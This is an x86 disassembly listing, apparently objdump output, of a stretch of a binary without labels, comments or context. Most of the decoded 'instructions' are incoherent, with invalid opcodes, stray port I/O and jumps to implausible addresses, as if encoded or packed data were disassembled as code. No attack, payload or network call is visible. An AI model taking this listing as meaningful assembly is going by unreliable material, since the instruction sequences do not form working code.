  407635:	e0 a0                	loopne 0x4075d7
  407637:	60                   	pusha
  407638:	a0 48 43 24 9f       	mov    0x9f244348,%al
  40763d:	5f                   	pop    %edi
  40763e:	2b f5                	sub    %ebp,%esi
  407640:	c0 5f 9f 5f          	rcrb   $0x5f,-0x61(%edi)
  407644:	2b a5 9c 48 55 24    	sub    0x2455489c(%ebp),%esp
  40764a:	9f                   	lahf
  40764b:	5f                   	pop    %edi
  40764c:	2b a5 9c 93 60 ba    	sub    -0x459f6c64(%ebp),%esp
  407652:	f9                   	stc
  407653:	b9 04 e9 b0 4b       	mov    $0x4bb0e904,%ecx
  407658:	b2 49                	mov    $0x49,%dl
  40765a:	d3 1d 9f 5f 2b a5    	rcrl   %cl,0xa52b5f9f
  407660:	9c                   	pushf
  407661:	48                   	dec    %eax
  407662:	b3 23                	mov    $0x23,%bl
  407664:	9f                   	lahf
  407665:	5f                   	pop    %edi
  407666:	88 3e                	mov    %bh,(%esi)
  407668:	5e                   	pop    %esi
  407669:	5f                   	pop    %edi
  40766a:	9f                   	lahf
  40766b:	93                   	xchg   %eax,%ebx
  40766c:	60                   	pusha
  40766d:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  407672:	b0 c8                	mov    $0xc8,%al
  407674:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  407675:	c2 e0 60             	ret    $0x60e0
  407678:	2d e5 c0 5f 9f       	sub    $0x9f5fc0e5,%eax
  40767d:	5f                   	pop    %edi
  40767e:	5a                   	pop    %edx
  40767f:	72 a0                	jb     0x407621
  407681:	60                   	pusha
  407682:	a0 48 b5 23 9f       	mov    0x9f23b548,%al
  407687:	5f                   	pop    %edi
  407688:	63 49 cf             	arpl   %ecx,-0x31(%ecx)
  40768b:	1e                   	push   %ds
  40768c:	9f                   	lahf
  40768d:	5f                   	pop    %edi
  40768e:	8b 48 ff             	mov    -0x1(%eax),%ecx
  407691:	be fb eb 85 bd       	mov    $0xbd85ebfb,%esi
  407696:	63 60 a0             	arpl   %esp,-0x60(%eax)
  407699:	5f                   	pop    %edi
  40769a:	9f                   	lahf
  40769b:	5f                   	pop    %edi
  40769c:	9f                   	lahf
  40769d:	99                   	cltd
  40769e:	a0 60 a0 b8 02       	mov    0x2b8a060,%al
  4076a3:	c1 d4 a2             	rcl    $0xa2,%esp
  4076a6:	f5                   	cmc
  4076a7:	c3                   	ret
  4076a8:	07                   	pop    %es
  4076a9:	cc                   	int3
  4076aa:	12 ba f5 93 fa b1    	adc    -0x4e056c0b(%edx),%bh
  4076b0:	15 a8 e3 b0 ed       	adc    $0xedb0e3a8,%eax
  4076b5:	a2 e9 b2 e1 d2       	mov    %al,0xd2e1b2e9
  4076ba:	e8 b7 f0 95 ec       	call   0xecd66776
  4076bf:	b3 1a                	mov    $0x1a,%bl
  4076c1:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4076c2:	12 97 0e b4 e2 d9    	adc    -0x261d4bf2(%edi),%dl
  4076c8:	d8 96 e8 b5 0c b3    	fcoms  -0x4cf34a18(%esi)
  4076ce:	e7 b5                	out    %eax,$0xb5
  4076d0:	e9 aa 1a a6 e3       	jmp    0xe3e6917f
  4076d5:	d6                   	salc
  4076d6:	0f a3 e2             	bt     %esp,%edx
  4076d9:	b2 a0                	mov    $0xa0,%dl
  4076db:	60                   	pusha
  4076dc:	a0 5f 9f 5f 9f       	mov    0x9f5f9f5f,%al
  4076e1:	61                   	popa
  4076e2:	a0 60 a0 8e a0       	mov    0xa08ea060,%al
  4076e7:	60                   	pusha
  4076e8:	a0 5f 9f 5f 9f       	mov    0x9f5f9f5f,%al
  4076ed:	75 a0                	jne    0x40768f
  4076ef:	60                   	pusha
  4076f0:	a0 97 15 b9 d9       	mov    0xd9b91597,%al
  4076f5:	ae                   	scas   %es:(%edi),%al
  4076f6:	e3 95                	jecxz  0x40768d
  4076f8:	13 aa 02 96 f2 97    	adc    -0x680d69fe(%edx),%ebp
  4076fe:	e8 a9 fa c4 d2       	call   0xd30571ac
  407703:	94                   	xchg   %eax,%esp
  407704:	e4 ae                	in     $0xae,%al
  407706:	a0 60 a0 5f 9f       	mov    0x9f5fa060,%al
  40770b:	5f                   	pop    %edi
  40770c:	9f                   	lahf
  40770d:	7f a0                	jg     0x4076af
  40770f:	60                   	pusha
  407710:	a0 a4 ef b1 e5       	mov    0xe5b1efa4,%al
  407715:	92                   	xchg   %eax,%edx
  407716:	ef                   	out    %eax,(%dx)
  407717:	98                   	cwtl
  407718:	14 ac                	adc    $0xac,%al
  40771a:	e2 8f                	loop   0x4076ab
  40771c:	f6 91 1a a6 d2 d3    	notb   -0x2c2d59e6(%ecx)
  407722:	f9                   	stc
  407723:	b4 e6                	mov    $0xe6,%ah
  407725:	b8 0b b7 05 aa       	mov    $0xaa05b70b,%eax
  40772a:	ea 8b 0a b6 e3 af a0 	ljmp   $0xa0af,$0xe3b60a8b
  407731:	5f                   	pop    %edi
  407732:	9f                   	lahf
  407733:	5f                   	pop    %edi
  407734:	9f                   	lahf
  407735:	61                   	popa
  407736:	a0 60 a0 80 a0       	mov    0xa080a060,%al
  40773b:	60                   	pusha
  40773c:	a0 5f 9f 5f 9f       	mov    0x9f5f9f5f,%al
  407741:	82 a0 60 a0 92 d9 a9 	andb   $0xa9,-0x266d5fa0(%eax)
  407748:	f0 c7                	lock (bad)
  40774a:	eb a1                	jmp    0x4076ed
  40774c:	cf                   	iret
  40774d:	90                   	nop
  40774e:	0a b7 f2 d4 0e ab    	or     -0x54f12b0e(%edi),%dh
  407754:	18 cb                	sbb    %cl,%bl
  407756:	18 c7                	sbb    %al,%bh
  407758:	0e                   	push   %cs
  407759:	ba 06 cd f9 91       	mov    $0x91f9cd06,%edx
  40775e:	e1 b2                	loope  0x407712
  407760:	e8 a1 0a b8 f9       	call   0xf9f88206
  407765:	a1 f2 60 a0 5f       	mov    0x5fa060f2,%eax
  40776a:	9f                   	lahf
  40776b:	5f                   	pop    %edi
  40776c:	9f                   	lahf
  40776d:	82 a0 60 a0 d9 f9 97 	andb   $0x97,-0x6265fa0(%eax)
  407774:	11 94 04 af d7 c4 cf 	adc    %edx,-0x303b2851(%esp,%eax,1)
  40777b:	c6                   	(bad)
  40777c:	ee                   	out    %al,(%dx)
  40777d:	c8 d3 ad 18          	enter  $0xadd3,$0x18
  407781:	cb                   	lret
  407782:	e6 a5                	out    %al,$0xa5
  407784:	d0 b1 0f ae 0f 90    	shlb   $1,-0x6ff051f1(%ecx)
  40778a:	e4 b5                	in     $0xb5,%al
  40778c:	0b aa d1 af d0 a3    	or     -0x5c2f502f(%edx),%ebp
  407792:	f2 60                	repnz pusha
  407794:	a0 5f 9f 5f 9f       	mov    0x9f5f9f5f,%al
  407799:	85 a0 60 a0 b0 02    	test   %esp,0x2b0a060(%eax)
  40779f:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4077a0:	0d da ed ad d4       	or     $0xd4adedda,%eax
  4077a5:	b6 eb                	mov    $0xeb,%dh
  4077a7:	94                   	xchg   %eax,%esp
  4077a8:	e9 c7 f1 c8 ed       	jmp    0xee096974
  4077ad:	da e3                	(bad)
  4077af:	d9 17                	fsts   (%edi)
  4077b1:	b2 d4                	mov    $0xd4,%dl
  4077b3:	91                   	xchg   %eax,%ecx
  4077b4:	d1 af d0 cb ee ca    	shrl   $1,-0x35113430(%edi)
  4077ba:	0d d3 1a c9 10       	or     $0x10c91ad3,%eax
  4077bf:	b0 e4                	mov    $0xe4,%al
  4077c1:	b2 a0                	mov    $0xa0,%dl
  4077c3:	60                   	pusha
  4077c4:	a0 5f 9f 5f 9f       	mov    0x9f5f9f5f,%al
  4077c9:	82 a0 60 a0 c6 e6 91 	andb   $0x91,-0x19395fa0(%eax)
  4077d0:	12 d9                	adc    %cl,%bl
  4077d2:	16                   	push   %ss
  4077d3:	b2 06                	mov    $0x6,%dl
  4077d5:	d1 15 b2 f2 ba f0    	rcll   $1,0xf0baf2b2
  4077db:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4077dc:	18 d7                	sbb    %dl,%bh
  4077de:	19 b6 f2 d1 f6 93    	sbb    %esi,-0x6c092e0e(%esi)
  4077e4:	d6                   	salc
  4077e5:	ad                   	lods   %ds:(%esi),%eax
  4077e6:	ee                   	out    %al,(%dx)
  4077e7:	b7 e6                	mov    $0xe6,%bh
  4077e9:	c3                   	ret
  4077ea:	07                   	pop    %es
  4077eb:	a1 eb a3 f2 60       	mov    0x60f2a3eb,%eax
  4077f0:	a0 5f 9f 5f 9f       	mov    0x9f5f9f5f,%al
  4077f5:	7a a0                	jp     0x407797
  4077f7:	60                   	pusha
  4077f8:	a0 ab e7 cc 05       	mov    0x5cce7ab,%al
  4077fd:	a2 f1 c4 f3 d3       	mov    %al,0xd3f3c4f1
  407802:	e2 93                	loop   0x407797
  407804:	f5                   	cmc
  407805:	d8 e7                	fsub   %st(7),%st
  407807:	b2 10                	mov    $0x10,%dl
  407809:	a9 d1 96 f3 b2       	test   $0xb2f396d1,%eax
  40780e:	f5                   	cmc
  40780f:	d7                   	xlat   %ds:(%ebx)
  407810:	d7                   	xlat   %ds:(%ebx)
  407811:	b0 ef                	mov    $0xef,%al
  407813:	60                   	pusha
  407814:	a0 5f 9f 5f 9f       	mov    0x9f5f9f5f,%al
  407819:	74 a0                	je     0x4077bb
  40781b:	60                   	pusha
  40781c:	a0 90 11 a2 18       	mov    0x18a21190,%al
  407821:	b5 11                	mov    $0x11,%ch
  407823:	b6 e8                	mov    $0xe8,%dh
  407825:	c2 e1 b9             	ret    $0xb9e1
  407828:	ec                   	in     (%dx),%al
  407829:	ce                   	into
  40782a:	eb c3                	jmp    0x4077ef
  40782c:	f6 a8 e3 a3 f0 60    	imulb  0x60f0a3e3(%eax)
  407832:	a0 60 a0 b5 2b       	mov    0x2bb5a060,%al
  407837:	4c                   	dec    %esp
  407838:	21 24 94             	and    %esp,(%esp,%edx,4)
  40783b:	5e                   	pop    %esi
  40783c:	9f                   	lahf
  40783d:	5f                   	pop    %edi
  40783e:	f3 b6 f7             	repz mov $0xf7,%dh
  407841:	93                   	xchg   %eax,%ebx
  407842:	72 e9                	jb     0x40782d
  407844:	35 54 9e 5f 9f       	xor    $0x9f5f9e54,%eax
  407849:	eb 78                	jmp    0x4078c3
  40784b:	93                   	xchg   %eax,%ebx
  40784c:	60                   	pusha
  40784d:	b5 08                	mov    $0x8,%ch
  40784f:	af                   	scas   %es:(%edi),%eax
  407850:	04 a0                	add    $0xa0,%al
  407852:	a0 c4 9f 90 04       	mov    0x4909fc4,%al
  407857:	e9 c0 eb 63 48       	jmp    0x48a4641c
  40785c:	b9 21 9f 5f d3       	mov    $0xd35f9f21,%ecx
  407861:	20 f5                	and    %dh,%ch
  407863:	c8 cc c4 e0          	enter  $0xc4cc,$0xe0
  407867:	60                   	pusha
  407868:	04 5f                	add    $0x5f,%al
  40786a:	d0 c4                	rol    $1,%ah
  40786c:	29 80 08 65 a1 60    	sub    %eax,0x60a16508(%eax)
  407872:	a0 ed 25 5b 9e       	mov    0x9e5b25ed,%al
  407877:	5f                   	pop    %edi
  407878:	9f                   	lahf
  407879:	b0 88                	mov    $0x88,%al
  40787b:	1a 70 5f             	sbb    0x5f(%eax),%dh
  40787e:	9f                   	lahf
  40787f:	eb 63                	jmp    0x4078e4
  407881:	ed                   	in     (%dx),%eax
  407882:	35 5b 9e 5f 9f       	xor    $0x9f5f9e5b,%eax
  407887:	19 a5 61 a0 60 88    	sbb    %esp,-0x779f5f9f(%ebp)
  40788d:	b0 62                	mov    $0x62,%al
  40788f:	5f                   	pop    %edi
  407890:	9f                   	lahf
  407891:	ed                   	in     (%dx),%eax
  407892:	35 54 9e 5f 9f       	xor    $0x9f5f9e54,%eax
  407897:	eb a3                	jmp    0x40783c
  407899:	48                   	dec    %eax
  40789a:	23 4d 9f             	and    -0x61(%ebp),%ecx
  40789d:	5f                   	pop    %edi
  40789e:	2b f5                	sub    %ebp,%esi
  4078a0:	94                   	xchg   %eax,%esp
  4078a1:	5e                   	pop    %esi
  4078a2:	9f                   	lahf
  4078a3:	5f                   	pop    %edi
  4078a4:	2b 23                	sub    (%ebx),%esp
  4078a6:	88 82 61 5f 9f 93    	mov    %al,-0x6c60a09f(%edx)
  4078ac:	60                   	pusha
  4078ad:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  4078b2:	b0 4b                	mov    $0x4b,%al
  4078b4:	aa                   	stos   %al,%es:(%edi)
  4078b5:	49                   	dec    %ecx
  4078b6:	77 1a                	ja     0x4078d2
  4078b8:	9f                   	lahf
  4078b9:	5f                   	pop    %edi
  4078ba:	88 ea                	mov    %ch,%dl
  4078bc:	5c                   	pop    %esp
  4078bd:	5f                   	pop    %edi
  4078be:	9f                   	lahf
  4078bf:	93                   	xchg   %eax,%ebx
  4078c0:	60                   	pusha
  4078c1:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  4078c6:	b0 c8                	mov    $0xc8,%al
  4078c8:	f6 c4 e0             	test   $0xe0,%ah
  4078cb:	60                   	pusha
  4078cc:	2d e5 94 5e 9f       	sub    $0x9f5e94e5,%eax
  4078d1:	5f                   	pop    %edi
  4078d2:	88 02                	mov    %al,(%edx)
  4078d4:	60                   	pusha
  4078d5:	5f                   	pop    %edi
  4078d6:	9f                   	lahf
  4078d7:	23 89 40 5b 5f 9f    	and    -0x60a0a4c0(%ecx),%ecx
  4078dd:	4b                   	dec    %ebx
  4078de:	8d bf fe bb 2b 45    	lea    0x452bbbfe(%edi),%edi
  4078e4:	fd                   	std
  4078e5:	23 2d a0 a0 b5 2b    	and    0x2bb5a0a0,%ebp
  4078eb:	4c                   	dec    %esp
  4078ec:	21 24 94             	and    %esp,(%esp,%edx,4)
  4078ef:	5d                   	pop    %ebp
  4078f0:	9f                   	lahf
  4078f1:	5f                   	pop    %edi
  4078f2:	f3 b6 f7             	repz mov $0xf7,%dh
  4078f5:	93                   	xchg   %eax,%ebx
  4078f6:	72 e9                	jb     0x4078e1
  4078f8:	35 54 9d 5f 9f       	xor    $0x9f5f9d54,%eax
  4078fd:	e9 35 58 9d 5f       	jmp    0x5fddd137
  407902:	9f                   	lahf
  407903:	eb 78                	jmp    0x40797d
  407905:	93                   	xchg   %eax,%ebx
  407906:	60                   	pusha
  407907:	b5 08                	mov    $0x8,%ch
  407909:	83 05 a0 a0 c4 9f 90 	addl   $0xffffff90,0x9fc4a0a0
  407910:	04 e9                	add    $0xe9,%al
  407912:	c0 eb 63             	shr    $0x63,%bl
  407915:	48                   	dec    %eax
  407916:	ff 20                	jmp    *(%eax)
  407918:	9f                   	lahf
  407919:	5f                   	pop    %edi
  40791a:	d3 20                	shll   %cl,(%eax)
  40791c:	f5                   	cmc
  40791d:	c8 9b c4 e0          	enter  $0xc49b,$0xe0
  407921:	60                   	pusha
  407922:	04 5f                	add    $0x5f,%al
  407924:	d0 c4                	rol    $1,%ah
  407926:	29 80 08 61 a2 60    	sub    %eax,0x60a26108(%eax)
  40792c:	a0 ed 25 5f 9d       	mov    0x9d5f25ed,%al
  407931:	5f                   	pop    %edi
  407932:	9f                   	lahf
  407933:	b0 2d                	mov    $0x2d,%al
  407935:	ed                   	in     (%dx),%eax
  407936:	98                   	cwtl
  407937:	5d                   	pop    %ebp
  407938:	9f                   	lahf
  407939:	5f                   	pop    %edi
  40793a:	d3 32                	shll   %cl,(%edx)
  40793c:	58                   	pop    %eax
  40793d:	9c                   	pushf
  40793e:	05 a0 a0 48 5f       	add    $0x5f48a0a0,%eax
  407943:	42                   	inc    %edx
  407944:	9f                   	lahf
  407945:	5f                   	pop    %edi
  407946:	2b e5                	sub    %ebp,%esp
  407948:	98                   	cwtl
  407949:	5d                   	pop    %ebp
  40794a:	9f                   	lahf
  40794b:	5f                   	pop    %edi
  40794c:	88 00                	mov    %al,(%eax)
  40794e:	63 5f 9f             	arpl   %ebx,-0x61(%edi)
  407951:	b0 88                	mov    $0x88,%al
  407953:	1a 6f 5f             	sbb    0x5f(%edi),%ch
  407956:	9f                   	lahf
  407957:	ed                   	in     (%dx),%eax
  407958:	25 54 9d 5f 9f       	and    $0x9f5f9d54,%eax
  40795d:	ed                   	in     (%dx),%eax
  40795e:	35 5f 9d 5f 9f       	xor    $0x9f5f9d5f,%eax
  407963:	19 a1 62 a0 60 88    	sbb    %esp,-0x779f5f9e(%ecx)
  407969:	d4 61                	aam    $0x61
  40796b:	5f                   	pop    %edi
  40796c:	9f                   	lahf
  40796d:	eb 25                	jmp    0x407994
  40796f:	54                   	push   %esp
  407970:	9d                   	popf
  407971:	5f                   	pop    %edi
  407972:	9f                   	lahf
  407973:	eb 73                	jmp    0x4079e8
  407975:	48                   	dec    %eax
  407976:	47                   	inc    %edi
  407977:	4c                   	dec    %esp
  407978:	9f                   	lahf
  407979:	5f                   	pop    %edi
  40797a:	d3 20                	shll   %cl,(%eax)
  40797c:	fa                   	cli
  40797d:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  407982:	8b 6a 89             	mov    -0x77(%edx),%ebp
  407985:	68 5a 5f 9f 48       	push   $0x489f5f5a
  40798a:	5b                   	pop    %ebx
  40798b:	1b 9f 5f d3 20 fa    	sbb    -0x5df2ca1(%edi),%ebx
  407991:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  407996:	08 8a 05 a0 a0 ed    	or     %cl,-0x125f5ffb(%edx)
  40799c:	25 54 9d 5f 9f       	and    $0x9f5f9d54,%eax
  4079a1:	1a a2 60 a0 60 88    	sbb    -0x779f5fa0(%edx),%ah
  4079a7:	52                   	push   %edx
  4079a8:	5f                   	pop    %edi
  4079a9:	5f                   	pop    %edi
  4079aa:	9f                   	lahf
  4079ab:	23 89 6c 5b 5f 9f    	and    -0x60a0a494(%ecx),%ecx
  4079b1:	4b                   	dec    %ebx
  4079b2:	88 bf fe bb 2b 45    	mov    %bh,0x452bbbfe(%edi)
  4079b8:	fd                   	std
  4079b9:	23 a0 60 a0 5f 9f    	and    -0x60a05fa0(%eax),%esp
  4079bf:	5f                   	pop    %edi
  4079c0:	9f                   	lahf
  4079c1:	77 a0                	ja     0x407963
  4079c3:	60                   	pusha
  4079c4:	a0 c6 1a d3 0f       	mov    0xfd31ac6,%al
  4079c9:	a3 e2 d9 0b 99       	mov    %eax,0x990bd9e2
  4079ce:	f4                   	hlt
  4079cf:	96                   	xchg   %eax,%esi
  4079d0:	f4                   	hlt
  4079d1:	d6                   	salc
  4079d2:	e7 92                	out    %eax,$0x92
  4079d4:	ee                   	out    %al,(%dx)
  4079d5:	b7 fa                	mov    $0xfa,%bh
  4079d7:	d4 d3                	aam    $0xd3
  4079d9:	ae                   	scas   %es:(%edi),%al
  4079da:	f4                   	hlt
  4079db:	b0 a0                	mov    $0xa0,%al
  4079dd:	b5 2b                	mov    $0x2b,%ch
  4079df:	4c                   	dec    %esp
  4079e0:	0a 60 f3             	or     -0xd(%eax),%ah
  4079e3:	93                   	xchg   %eax,%ebx
  4079e4:	60                   	pusha
  4079e5:	b5 08                	mov    $0x8,%ch
  4079e7:	02 05 a0 a0 c4 9f    	add    0x9fc4a0a0,%al
  4079ed:	90                   	nop
  4079ee:	04 e9                	add    $0xe9,%al
  4079f0:	c0 ed e5             	shr    $0xe5,%ch
  4079f3:	5c                   	pop    %esp
  4079f4:	88 9c 9e 5f 9f eb e5 	mov    %bl,-0x1a1460a1(%esi,%ebx,4)
  4079fb:	5c                   	pop    %esp
  4079fc:	5a                   	pop    %edx
  4079fd:	61                   	popa
  4079fe:	a0 60 a0 aa 25       	mov    0x25aaa060,%al
  407a03:	20 14 65 db b0 9c d2 	and    %dl,-0x2d634f25(,%eiz,2)
  407a0a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407a0b:	48                   	dec    %eax
  407a0c:	59                   	pop    %ecx
  407a0d:	16                   	push   %ss
  407a0e:	9f                   	lahf
  407a0f:	5f                   	pop    %edi
  407a10:	e2 ea                	loop   0x4079fc
  407a12:	fc                   	cld
  407a13:	70 9f                	jo     0x4079b4
  407a15:	93                   	xchg   %eax,%ebx
  407a16:	60                   	pusha
  407a17:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  407a1c:	b0 c8                	mov    $0xc8,%al
  407a1e:	49                   	dec    %ecx
  407a1f:	c5 e0 60             	(bad)
  407a22:	2d a5 9c 48 ef       	sub    $0xef489ca5,%eax
  407a27:	1f                   	pop    %ds
  407a28:	9f                   	lahf
  407a29:	5f                   	pop    %edi
  407a2a:	63 49 2d             	arpl   %ecx,0x2d(%ecx)
  407a2d:	1a 9f 5f 8b 50 2b    	sbb    0x2b508b5f(%edi),%bl
  407a33:	23 fb                	and    %ebx,%edi
  407a35:	b9 fd 23 30 b5       	mov    $0xb53023fd,%ecx
  407a3a:	2b 4c 23 24          	sub    0x24(%ebx,%eiz,1),%ecx
  407a3e:	84 b3 f6 93 69 e9    	test   %dh,-0x16966c0a(%ebx)
  407a44:	ed                   	in     (%dx),%eax
  407a45:	48                   	dec    %eax
  407a46:	29 ad 84 eb 92 eb    	sub    %ebp,-0x146d147c(%ebp)
  407a4c:	78 93                	js     0x4079e1
  407a4e:	60                   	pusha
  407a4f:	b5 08                	mov    $0x8,%ch
  407a51:	07                   	pop    %es
  407a52:	06                   	push   %es
  407a53:	a0 a0 c4 9f 90       	mov    0x909fc4a0,%al
  407a58:	04 e9                	add    $0xe9,%al
  407a5a:	c0 eb 66             	shr    $0x66,%bl
  407a5d:	48                   	dec    %eax
  407a5e:	b7 1f                	mov    $0x1f,%bh
  407a60:	9f                   	lahf
  407a61:	5f                   	pop    %edi
  407a62:	0a 61 88             	or     -0x78(%ecx),%ah
  407a65:	48                   	dec    %eax
  407a66:	6e                   	outsb  %ds:(%esi),(%dx)
  407a67:	5f                   	pop    %edi
  407a68:	9f                   	lahf
  407a69:	e5 60                	in     $0x60,%eax
  407a6b:	d9 a5 48 f7 16 9f    	fldenv -0x60e908b8(%ebp)
  407a71:	5f                   	pop    %edi
  407a72:	29 a5 9c 93 60 b5    	sub    %esp,-0x4a9f6c64(%ebp)
  407a78:	08 e5                	or     %ah,%ch
  407a7a:	06                   	push   %es
  407a7b:	a0 a0 c4 9f 90       	mov    0x909fc4a0,%al
  407a80:	04 e9                	add    $0xe9,%al
  407a82:	c0 ca a0             	ror    $0xa0,%dl
  407a85:	ca a0 ed             	lret   $0xeda0
  407a88:	e5 54                	in     $0x54,%eax
  407a8a:	f0 ed                	lock in (%dx),%eax
  407a8c:	e5 58                	in     $0x58,%eax
  407a8e:	f0 ed                	lock in (%dx),%eax
  407a90:	e5 50                	in     $0x50,%eax
  407a92:	f0 ca a0 ca          	lock lret $0xcaa0
  407a96:	a0 ed e5 48 2b       	mov    0x2b48e5ed,%al
  407a9b:	33 88 54 5f 5f 9f    	xor    -0x60a0a0ac(%eax),%ecx
  407aa1:	ed                   	in     (%dx),%eax
  407aa2:	e5 48                	in     $0x48,%eax
  407aa4:	f0 ed                	lock in (%dx),%eax
  407aa6:	ed                   	in     (%dx),%eax
  407aa7:	44                   	inc    %esp
  407aa8:	d3 32                	shll   %cl,(%edx)
  407aaa:	58                   	pop    %eax
  407aab:	1c 06                	sbb    $0x6,%al
  407aad:	a0 a0 48 f1 41       	mov    0x41f148a0,%al
  407ab2:	9f                   	lahf
  407ab3:	5f                   	pop    %edi
  407ab4:	2b b5 84 b8 88 a4    	sub    -0x5b77477c(%ebp),%esi
  407aba:	60                   	pusha
  407abb:	5f                   	pop    %edi
  407abc:	9f                   	lahf
  407abd:	eb e5                	jmp    0x407aa4
  407abf:	48                   	dec    %eax
  407ac0:	88 8c 62 5f 9f b0 88 	mov    %cl,-0x774f60a1(%edx,%eiz,2)
  407ac7:	de 6e 5f             	fisubrs 0x5f(%esi)
  407aca:	9f                   	lahf
  407acb:	e5 60                	in     $0x60,%eax
  407acd:	d4 bf                	aam    $0xbf
  407acf:	ed                   	in     (%dx),%eax
  407ad0:	f5                   	cmc
  407ad1:	4c                   	dec    %esp
  407ad2:	2d a5 90 19 a4       	sub    $0xa41990a5,%eax
  407ad7:	60                   	pusha
  407ad8:	a0 60 88 16 4c       	mov    0x4c168860,%al
  407add:	5f                   	pop    %edi
  407ade:	9f                   	lahf
  407adf:	eb 6e                	jmp    0x407b4f
  407ae1:	1a a8 60 a0 60 2b    	sbb    0x2b60a060(%eax),%ch
  407ae7:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407ae8:	8c 48 77             	mov    %cs,0x77(%eax)
  407aeb:	36 9f                	ss lahf
  407aed:	5f                   	pop    %edi
  407aee:	d3 20                	shll   %cl,(%eax)
  407af0:	fa                   	cli
  407af1:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  407af6:	08 ec                	or     %ch,%ah
  407af8:	06                   	push   %es
  407af9:	a0 a0 eb e5 5c       	mov    0x5ce5eba0,%al
  407afe:	25 20 19 65 88       	and    $0x88651920,%eax
  407b03:	22 55 5f             	and    0x5f(%ebp),%dl
  407b06:	9f                   	lahf
  407b07:	b0 88                	mov    $0x88,%al
  407b09:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407b0a:	6e                   	outsb  %ds:(%esi),(%dx)
  407b0b:	5f                   	pop    %edi
  407b0c:	9f                   	lahf
  407b0d:	23 89 0a 59 5f 9f    	and    -0x60a0a6f6(%ecx),%ecx
  407b13:	4b                   	dec    %ebx
  407b14:	86 93 60 ba f9 b9    	xchg   %dl,-0x460645a0(%ebx)
  407b1a:	04 e9                	add    $0xe9,%al
  407b1c:	b0 c8                	mov    $0xc8,%al
  407b1e:	4e                   	dec    %esi
  407b1f:	c6                   	(bad)
  407b20:	e0 60                	loopne 0x407b82
  407b22:	2d a5 84 1a a2       	sub    $0xa21a84a5,%eax
  407b27:	60                   	pusha
  407b28:	a0 60 88 ce 5e       	mov    0x5ece8860,%al
  407b2d:	5f                   	pop    %edi
  407b2e:	9f                   	lahf
  407b2f:	23 89 e8 59 5f 9f    	and    -0x60a0a618(%ecx),%ecx
  407b35:	4b                   	dec    %ebx
  407b36:	8b be fb eb 85 bd    	mov    -0x427a1405(%esi),%edi
  407b3c:	63 5f 9f             	arpl   %ebx,-0x61(%edi)
  407b3f:	5f                   	pop    %edi
  407b40:	9f                   	lahf
  407b41:	74 a0                	je     0x407ae3
  407b43:	60                   	pusha
  407b44:	a0 c1 d2 af 18       	mov    0x18afd2c1,%al
  407b49:	cf                   	iret
  407b4a:	e3 98                	jecxz  0x407ae4
  407b4c:	11 ab 04 aa 12 c1    	adc    %ebp,-0x3eed55fc(%ebx)
  407b52:	f0 96                	lock xchg %eax,%esi
  407b54:	f5                   	cmc
  407b55:	8f                   	(bad)
  407b56:	f9                   	stc
  407b57:	b5 f0                	mov    $0xf0,%ch
  407b59:	60                   	pusha
  407b5a:	a0 60 a0 b3 2b       	mov    0x2bb3a060,%al
  407b5f:	38 88 d8 9e 5f 9f    	cmp    %cl,-0x60a06128(%eax)
  407b65:	eb 73                	jmp    0x407bda
  407b67:	48                   	dec    %eax
  407b68:	6d                   	insl   (%dx),%es:(%edi)
  407b69:	5e                   	pop    %esi
  407b6a:	9f                   	lahf
  407b6b:	5f                   	pop    %edi
  407b6c:	fb                   	sti
  407b6d:	23 2d a0 a0 b5 2b    	and    0x2bb5a0a0,%ebp
  407b73:	4c                   	dec    %esp
  407b74:	d3 20                	shll   %cl,(%eax)
  407b76:	f5                   	cmc
  407b77:	c8 ad c7 e0          	enter  $0xc7ad,$0xe0
  407b7b:	60                   	pusha
  407b7c:	04 5f                	add    $0x5f,%al
  407b7e:	d0 c4                	rol    $1,%ah
  407b80:	29 80 9f 65 48 16    	sub    %eax,0x1648659f(%eax)
  407b86:	e0 60                	loopne 0x407be8
  407b88:	d3 20                	shll   %cl,(%eax)
  407b8a:	fa                   	cli
  407b8b:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  407b90:	08 74 07 a0          	or     %dh,-0x60(%edi,%eax,1)
  407b94:	a0 23 89 82 59       	mov    0x59828923,%al
  407b99:	5f                   	pop    %edi
  407b9a:	9f                   	lahf
  407b9b:	4b                   	dec    %ebx
  407b9c:	98                   	cwtl
  407b9d:	bd 63 eb 60 e3       	mov    $0xe360eb63,%ebp
  407ba2:	cd 08                	int    $0x8
  407ba4:	56                   	push   %esi
  407ba5:	a0 a0 61 63 b3       	mov    0xb36361a0,%al
  407baa:	41                   	inc    %ecx
  407bab:	18 56 a0             	sbb    %dl,-0x60(%esi)
  407bae:	a0 eb b5 20 56       	mov    0x5620b5eb,%al
  407bb3:	a0 a0 ea bc 70       	mov    0x70bceaa0,%al
  407bb8:	9f                   	lahf
  407bb9:	65 60                	gs pusha
  407bbb:	16                   	push   %ss
  407bbc:	e0 60                	loopne 0x407c1e
  407bbe:	41                   	inc    %ecx
  407bbf:	20 56 a0             	and    %dl,-0x60(%esi)
  407bc2:	a0 9b a5 24 56       	mov    0x5624a59b,%al
  407bc7:	a0 a0 d5 a6 5f       	mov    0x5fa6d5a0,%al
  407bcc:	b5 14                	mov    $0x14,%ch
  407bce:	56                   	push   %esi
  407bcf:	a0 a0 eb 63 bb       	mov    0xbb63eba0,%al
  407bd4:	63 eb                	arpl   %ebp,%ebx
  407bd6:	b5 1c                	mov    $0x1c,%ch
  407bd8:	56                   	push   %esi
  407bd9:	a0 a0 eb ad 28       	mov    0x28adeba0,%al
  407bde:	56                   	push   %esi
  407bdf:	a0 a0 e8 a4 6a       	mov    0x6aa4e8a0,%al
  407be4:	9f                   	lahf
  407be5:	65 68 16 e0 60 41    	gs push $0x4160e016
  407beb:	28 56 a0             	sub    %dl,-0x60(%esi)
  407bee:	a0 9b a5 2c 56       	mov    0x562ca59b,%al
